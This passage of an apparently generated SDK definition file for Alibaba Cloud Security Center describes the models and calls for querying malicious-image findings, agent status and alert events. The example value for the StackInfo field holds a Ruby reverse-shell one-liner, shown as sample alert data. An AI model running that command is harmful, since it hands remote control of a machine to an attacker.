      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://aegis-metadata-file.oss-cn-shanghai.aliyuncs.com/'),
      filePath?: string(name='FilePath', description='The path to the image file.', example='/d836968041f7683b5605a****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp of the first scan.', example='1594907349000'),
      highLight?: string(name='HighLight', description='The text that is highlighted.', example='{"ruleVersion":"highlight_20210908","ruleId":600106,"events":[[2,54]]}'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e05c0de798217637868ef4****'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp of the last scan.', example='1596522785000'),
      latestVerifyTimestamp?: long(name='LatestVerifyTimestamp', description='The timestamp of the last verification.', example='1596522711000'),
      layer?: string(name='Layer', description='The image layer.', example='27213ad3447f0209dd152a5cadea****'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f768300d9605a****'),
      namespace?: string(name='Namespace', description='The namespace to which the image repository belongs.', example='hanghai-namespace'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-vridcl4****'),
      repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.', example='cri-datvail3m****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='centos'),
      repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-shanghai'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.2'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      uuid?: string(name='Uuid'),
    }
  ](name='AffectedMaliciousFileImagesResponse', description='An array consisting of the images that have malicious image samples.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images that have malicious image samples returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of images that have malicious image samples.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAffectedMaliciousFileImagesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedMaliciousFileImagesResponseBody(name='body'),
}

async function describeAffectedMaliciousFileImagesWithOptions(request: DescribeAffectedMaliciousFileImagesRequest, runtime: Util.RuntimeOptions): DescribeAffectedMaliciousFileImagesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedMaliciousFileImages',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedMaliciousFileImages(request: DescribeAffectedMaliciousFileImagesRequest): DescribeAffectedMaliciousFileImagesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedMaliciousFileImagesWithOptions(request, runtime);
}

model DescribeAgentInstallStatusRequest {
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='59.46.XXX.XXX'),
  uuids?: string(name='Uuids', example='inet-eae014a7-16c4-4d4e-9f03-5208f4dc****,inet-eae047da-1e5a-41ce-828d-47606e9b****'),
}

model DescribeAgentInstallStatusResponseBody = {
  aegisClientInvokeStatusResponseList?: [ 
    {
      message?: string(name='Message'),
      resuleCode?: string(name='ResuleCode', example='1'),
      result?: int32(name='Result', example='0'),
      uuid?: string(name='Uuid', example='d123f6ae-9749-4338-8c7f-3c2c1ead****'),
    }
  ](name='AegisClientInvokeStatusResponseList'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeAgentInstallStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAgentInstallStatusResponseBody(name='body'),
}

async function describeAgentInstallStatusWithOptions(request: DescribeAgentInstallStatusRequest, runtime: Util.RuntimeOptions): DescribeAgentInstallStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAgentInstallStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAgentInstallStatus(request: DescribeAgentInstallStatusRequest): DescribeAgentInstallStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAgentInstallStatusWithOptions(request, runtime);
}

model DescribeAlarmEventDetailRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details of an alert event, you must specify the unique ID of the alert event. You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeAlarmEventDetailResponseBody = {
  data?: {
    alarmEventAliasName?: string(name='AlarmEventAliasName', description='The name of the alert event.', example='Login with unusual location'),
    alarmEventDesc?: string(name='AlarmEventDesc', description='The description of the alert event.', example='The detection model finds that self-mutation is running on your server. A self-mutation Trojan is a Trojan horse program with self-mutation function. It will change its hash or copy a large number of itself to different paths, and run in the background to avoid cleaning.'),
    alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details about an alert event, you must specify the unique ID of the alert event. You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
    appName?: string(name='AppName', description='The name of the container application.', example='app:msdp-uat-service'),
    canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    causeDetails?: [ 
      {
        key?: string(name='Key', description='The key that is used to trace the alert event.', example='842e314e69b1a2c45d5c1a2f88a16***'),
        value?: [ 
          {
            name?: string(name='Name', description='The name of the field that displays tracing information.', example='sshd'),
            type?: string(name='Type', description='The type of the field that displays tracing information. Valid values:

*   **text**
*   **html**', example='html'),
            value?: string(name='Value', description='The value of the field that displays tracing information.', example='<p>under a certain small probability, yundun may mistakenly judge the repeated attempts caused by the administrator forgetting or entering the wrong password as successful blasting. Please check according to the account number and time shown in the alarm details. Once it is confirmed that it is not the initiative of the administrator, it is recommended to immediately block the IP, and you can open it at the same time<a href="https://yundun.console.aliyun.com/?p=pam">PAM</a>, hosting host login password, improving remote connection efficiency and security control ability, and according to<a href="https://click.aliyun.com/m/1000226086/">best practice of ECS account security protection</a>Modify login password and convergence asset.</p>↵'),
          }
        ](name='Value', description='An array consisting of the value that is used to trace the alert event.'),
      }
    ](name='CauseDetails', description='An array consisting of the cause of the alert event, which can be used to trace the alert event.'),
    containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled.', example='true'),
    containerId?: string(name='ContainerId', description='The ID of the container application.', example='container_1606995441910_394868_01_000***'),
    containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='cadb7a725641'),
    containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='jenkins/jenkins:latest'),
    dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_***'),
    endTime?: long(name='EndTime', description='The timestamp when the alert event ends. Unit: milliseconds.', example='1542366542000'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='172.25.30.**'),
    k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c562cf0d68e9749ee9fe544a7ab2f****'),
    k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='TestK8sCluser'),
    k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='sit-saic-trip'),
    k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0l***'),
    k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='cn-hangzhou.10.188.139.**'),
    k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
    level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    solution?: string(name='Solution', description='The solution to the alert event.', example='An invalid logon source IP has been detected. If you recognize this logon attempt, we recommend that you add the current logon source IP to the valid logon source IP list to avoid future alerts. If you do not recognize this logon attempt, we recommend that you modify the password.'),
    startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1542378601000'),
    type?: string(name='Type', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception', example='Webshell'),
    uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The details about the alert event.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7EA50837-2F0B-5BCC-AB61-4968D88D75AD'),
}

model DescribeAlarmEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventDetailResponseBody(name='body'),
}

async function describeAlarmEventDetailWithOptions(request: DescribeAlarmEventDetailRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventDetail(request: DescribeAlarmEventDetailRequest): DescribeAlarmEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventDetailWithOptions(request, runtime);
}

model DescribeAlarmEventListRequest {
  alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.

>  You can call the [DescribeNsasSuspEventType](~~DescribeNsasSuspEventType~~) operation to query the names of alert events.', example='Trojan'),
  alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.

>  You can call the [DescribeNsasSuspEventType](~~DescribeNsasSuspEventType~~) operation to query the types of alert events.', example='Malicious Software'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='Y'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas'),
  groupId?: string(name='GroupId', description='The ID of the asset group to which the affected asset belongs.', example='18732'),
  id?: long(name='Id', description='The ID of the alert event.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='An array that consists of the handling result codes of alert events.', example='ignore. Success'),
  operateTimeEnd?: string(name='OperateTimeEnd', description='The time when the handling operation ends.', example='2022-07-06 13:50:38'),
  operateTimeStart?: string(name='OperateTimeStart', description='The time when the handing operation starts.', example='2022-07-05 13:50:38'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  remark?: string(name='Remark', description='The name of the alert or the information about the asset.', example='database_server'),
  sortColumn?: string(name='SortColumn', description='The custom sorting field. Default value: **operateTime**. Valid values:

*   **lastTime**: the latest occurrence time
*   **operateTime**: the handling time

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='operateTime'),
  sortType?: string(name='SortType', description='The custom sorting order. Default value: **desc**. Valid values:

*   **asc**: the ascending order
*   **desc**: the descending order

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='desc'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='27.9.XX.XX'),
  tacticId?: string(name='TacticId', description='The tactic ID of ATT\\&CK.', example='TA0001'),
  timeEnd?: string(name='TimeEnd', description='The end time when the alert event was last detected.', example='2022-07-06 13:50:38'),
  timeStart?: string(name='TimeStart', description='The start time when the alert event was last detected.', example='2022-07-05 13:50:38'),
  uniqueInfo?: string(name='UniqueInfo', description='The ID of the alert event.', example='81c43b54073bbd922bcd887fddd8ba98'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='e8d8a2da-f9ce-4402-a1c6-0c4dc15b****'),
}

model DescribeAlarmEventListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned per page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='28267723-D857-4DD8-B295-013100000000'),
  suspEvents?: [ 
    {
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='Trojan'),
      alarmEventNameOriginal?: string(name='AlarmEventNameOriginal', description='The original parent name of the alert event.', example='Trojan'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Malicious Software'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.', example='8df914418f4211fbf756efe7a6f4****'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online processing of the alert event is supported, such as quarantining the source file of the malicious process, adding the alert event to the whitelist, and ignoring the alert event. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_****'),
      dealed?: boolean(name='Dealed', description='Indicates whether the alert event is handled. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      description?: string(name='Description', description='The description of the alert event.', example='The detection model finds that there is a Trojan horse program on your server. The Trojan horse program is a program specially used to invade the user\\"s host. Generally, it will download and release another malicious program after being implanted into the system through disguise.'),
      endTime?: long(name='EndTime', description='The timestamp when the alert event was last detected. Unit: milliseconds.', example='1543740301000'),
      gmtModified?: long(name='GmtModified', description='The timestamp when the alert event was last modified. Unit: milliseconds.', example='1569235879000'),
      hasTraceInfo?: boolean(name='HasTraceInfo', description='Indicates whether the alert event has tracing information. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the affected asset.', example='i-e****'),
      instanceName?: string(name='InstanceName', description='The name of the affected asset.', example='TestInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='123.21.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the affected asset.', example='192.168.XX.XX'),
      level?: string(name='Level', description='The risk level of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      operateErrorCode?: string(name='OperateErrorCode', description='The handling result code of the alert event.', example='kill_and_quara.Success'),
      operateTime?: long(name='OperateTime', description='The timestamp when the alert event was handled. Unit: milliseconds.', example='1631699497000'),
      saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the alert event can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Advanced edition
*   **2**: Enterprise edition', example='1'),
      securityEventIds?: string(name='SecurityEventIds', description='The IDs of the associated exceptions.', example='270789'),
      solution?: string(name='Solution', description='The solution to the alert event.', example='A malicious program implanted by hacker after intrusion will occupy your bandwidth and attack other servers, and may affect you own service. The malicious process may also have self-deleting behavior or disguise as a system service to evade detection.'),
      stages?: string(name='Stages', description='The stage at which the attack or intrusion is detected.', example='[\\"authority_maintenance\\"]'),
      startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1543740301000'),
      suspiciousEventCount?: int32(name='SuspiciousEventCount', description='The number of associated exceptions.', example='1'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName', description='The tactic name of ATT\\&CK.', example='Command and Control'),
          tacticId?: string(name='TacticId', description='The tactic ID of ATT\\&CK.', example='TA0001'),
        }
      ](name='TacticItems', description='An array that consists of the stage information about ATT\\&CK.'),
      uuid?: string(name='Uuid', description='The ID of the associated instance.', example='47900178-885d-4fa4-9d77-****'),
    }
  ](name='SuspEvents', description='An array that consists of the alert events.'),
}

model DescribeAlarmEventListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventListResponseBody(name='body'),
}

/**
  * The alert aggregation feature of Security Center analyzes the paths of alerts to aggregate multiple alerts generated on the intrusions that are launched from the same IP address or service, or on the same user.
  * You can call the DescribeAlarmEventList or DescribeSuspEvents operation to query alert events.
  * *   If your Security Center runs the Enterprise or Ultimate edition and you turned on **Alert Association** on the **Feature Settings** page of the Security Center console, you can call the DescribeAlarmEventList operation to query alert events.
  * *   If your Security Center runs the Enterprise or Ultimate edition but you turned off **Alert Association** on the **Feature Settings** page of the Security Center console, you can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query alert events.
  * *   If your Security Center does not run the Enterprise or Ultimate edition, you can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query alert events.
  *
  * @param request DescribeAlarmEventListRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeAlarmEventListResponse
 */
async function describeAlarmEventListWithOptions(request: DescribeAlarmEventListRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmEventName)) {
    query['AlarmEventName'] = request.alarmEventName;
  }
  if (!Util.isUnset(request.alarmEventType)) {
    query['AlarmEventType'] = request.alarmEventType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tacticId)) {
    query['TacticId'] = request.tacticId;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The alert aggregation feature of Security Center analyzes the paths of alerts to aggregate multiple alerts generated on the intrusions that are launched from the same IP address or service, or on the same user.
  * You can call the DescribeAlarmEventList or DescribeSuspEvents operation to query alert events.
  * *   If your Security Center runs the Enterprise or Ultimate edition and you turned on **Alert Association** on the **Feature Settings** page of the Security Center console, you can call the DescribeAlarmEventList operation to query alert events.
  * *   If your Security Center runs the Enterprise or Ultimate edition but you turned off **Alert Association** on the **Feature Settings** page of the Security Center console, you can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query alert events.
  * *   If your Security Center does not run the Enterprise or Ultimate edition, you can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query alert events.
  *
  * @param request DescribeAlarmEventListRequest
  * @return DescribeAlarmEventListResponse
 */
async function describeAlarmEventList(request: DescribeAlarmEventListRequest): DescribeAlarmEventListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventListWithOptions(request, runtime);
}

model DescribeAlarmEventStackInfoRequest {
  eventName?: string(name='EventName', description='The name of the event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of events.', example='Mining program'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  uniqueInfo?: string(name='UniqueInfo', description='The ID of the alert event.', example='1fbe8d16727f61d1478a674d6fa0****'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='18b7336e-d469-473b-af83-8e5420f9****'),
}

model DescribeAlarmEventStackInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
  stackInfo?: string(name='StackInfo', description='The stack information of the alert details.', example='\\[ { "child": \\[ { "child": \\[ { "child": \\[ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "\\[3033]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": \\[ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "\\[3035]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\"id && whoami\\"", "proc_path": "/bin/bash", "pid": "\\[3022]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\"0.0.0.0\\\\",\\\\"1111\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\"r\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": \\[ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]'),
}

model DescribeAlarmEventStackInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventStackInfoResponseBody(name='body'),
}

async function describeAlarmEventStackInfoWithOptions(request: DescribeAlarmEventStackInfoRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventStackInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventStackInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventStackInfo(request: DescribeAlarmEventStackInfoRequest): DescribeAlarmEventStackInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventStackInfoWithOptions(request, runtime);
}

model DescribeAllEntityResponseBody = {
  entityList?: [ 
    {
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='abc'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='172.19.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='101.132.XX.XX'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**', example='windows'),
